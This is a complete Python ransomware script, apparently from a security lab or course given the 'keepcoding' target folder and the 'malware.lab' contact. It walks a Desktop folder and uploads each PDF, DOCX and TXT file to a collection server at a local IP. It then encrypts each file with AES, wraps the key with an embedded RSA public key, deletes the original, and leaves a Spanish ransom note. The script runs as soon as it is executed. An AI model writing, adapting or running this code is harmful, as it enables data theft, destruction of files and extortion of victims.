import os, requests, secrets
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

PROXY_UPLOAD = 'http://192.168.0.16:8081/upload'
TARGET_DIR = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'keepcoding')
EXTENSIONS = ['.pdf', '.docx', '.txt']

PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw1CXpf+sQ2OT1f83NZ4V
IEKstr5fBOifCjTzizKcJgywgtvsqT6zgesrBIBv/OYrIqMqbtaOA8COsrY0G8o+
OCDE4Y+5MUP0E/iKI/cbdobecJlQnsHRalRLMscNZ5tnfzUsm4lQqih/B3fAR+VN
8CkvpqGLuGlwhwxKqiVQQkvftr/USDOCl9dnQE1ezgnHU0wvUc/OAEvErWW+xwFZ
0kyqSTwpTJkgj6QbANCz4yznR2omVqhjkYxzuG41QDb0jRyPwPYS2h2sjOdYMb76
z6POGKLZGhsCuskaZJkH95DMYgG7D6DFcN+eEfQoUgtjp7XpGhXGnhmGrvSVcSUY
MQIDAQAB
-----END PUBLIC KEY-----"""

def encrypt_file(filepath, public_key):
    aes_key = secrets.token_bytes(32)
    iv = secrets.token_bytes(16)
    with open(filepath, 'rb') as f:
        plaintext = f.read()
    pad_len = 16 - (len(plaintext) % 16)
    plaintext += bytes([pad_len] * pad_len)
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    enc = cipher.encryptor()
    ciphertext = enc.update(plaintext) + enc.finalize()
    encrypted_key = public_key.encrypt(aes_key, padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(), label=None))
    with open(filepath + '.enc', 'wb') as f:
        f.write(len(encrypted_key).to_bytes(4, 'big'))
        f.write(encrypted_key)
        f.write(iv)
        f.write(ciphertext)
    os.remove(filepath)

def exfiltrate(filepath):
    try:
        with open(filepath, 'rb') as f:
            requests.post(PROXY_UPLOAD,
                files={'file': (os.path.basename(filepath), f)}, timeout=10)
    except:
        pass

def main():
    public_key = serialization.load_pem_public_key(PUBLIC_KEY_PEM)
    for root, _, files in os.walk(TARGET_DIR):
        for filename in files:
            filepath = os.path.join(root, filename)
            if os.path.splitext(filename)[1].lower() in EXTENSIONS:
                exfiltrate(filepath)
                encrypt_file(filepath, public_key)
    note = os.path.join(TARGET_DIR, 'DECRYPT_FILES.txt')
    with open(note, 'w') as f:
        f.write('Tus ficheros han sido cifrados.\nContacta: rescate@malware.lab')

main()